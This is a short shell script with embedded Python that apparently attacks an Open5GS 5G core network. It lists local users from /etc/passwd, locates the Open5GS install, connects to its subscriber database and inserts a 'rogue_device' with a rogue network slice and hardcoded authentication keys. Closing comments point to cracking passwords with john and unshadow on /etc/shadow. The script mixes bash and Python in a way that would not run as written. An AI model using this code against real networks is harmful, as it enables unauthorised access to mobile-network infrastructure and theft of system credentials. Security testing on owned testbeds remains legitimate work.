#!/bin/bash

#grep -w -v -e "nologin" -e "bin/false" -e "admin" -e "root" -e "sync" /etc/passwd


otheruser=$(grep -w -v -e "nologin" -e "bin/false" -e "admin" -e "root" -e "sync" /etc/passwd | cut -d ":" -f 1)
echo "there is another user:  ${otheruser}"
path_to_open_5gs=$(find / -type d -name "open5gs" | head -n 1)
echo ${path_to_open_5gs}
cd ${path_to_open_5gs}

cd misc/db/python

pwd

python3
import Open5GS

print()

O= Open5GS.Open5GS("127.0.0.1", 27017) #connect to mongodb of open5gs

def check_subscribers(O):
	subscribers=O.GetSubscribers() 		# check open5gs subscibers

	print()
	print("##############################################################")
	print()
	print()
	print("Subscribed to core network:")  
	for subscriber in subscribers:
		print ("IMSI:", subscriber["imsi"])  #check subscriber data
		for slice in subscriber["slice"]:
			#print (slice)
			print("In slice: sst:", slice["sst"], ", slice name: ", slice["session"][0]["name"], ", priority level: ", slice["session"][0]["qos"]["arp"]["priority_level"])

	print()
	print("##############################################################")
	print()
	print()

rogue_slice=[
	{
	"sst":1,
	"default_indicator":True,
	"session":[
		{
		"name": "rogue_slice",
		"type": 3,
		"pcc_rule":[],
		"ambr": {
			"uplink":{
				"value": 1,
				"unit": 3,
				},
			"downlink":{
				"value":1,
				"unit": 3,
				}
			},
		"qos" : {
			"index": 8,
			"arp":{
				"priority_level": 9,
				"pre_emption_capability":1,
				"pre_emption_vulnerability": 1}
			}
		}
	]
	}
]


rogue_device={
	"imsi": "901700000000005",
	"subscribed_rau_timer": 12,
	"network_access_mode": 0,
	"subscriber_status": 0,
	"access_restriction_data": 32,
	"slice": rogue_slice,
	"ambr":{
		"uplink": {
			"value": 1,
			"unit": 3},
		"downlink": {
			"value": 1,
			"unit" : 3}
		},
	"security":{
		"k": "465B5CE8 B199B49F AA5F0A2E E238A6BC",
		"amf": "8000",
		"op": None,
		"opc": "E8ED289D EBA9524E8 283B548 8E6183CA"
		},
	"schema_version": 1,
	"__v":0
	 }


check_subscribers(O)
print (O.AddSubscriber(rogue_device))
print(O.GetSubscriber("901700000000005"))

check_subscribers(O)

#print(O.DeleteSubscriber("901700000000005"))

#check_subscribers(O)

exit()
#touch add_sub.py
#sudo apto install john
#unshadow /etc/passwd /etc/shadow


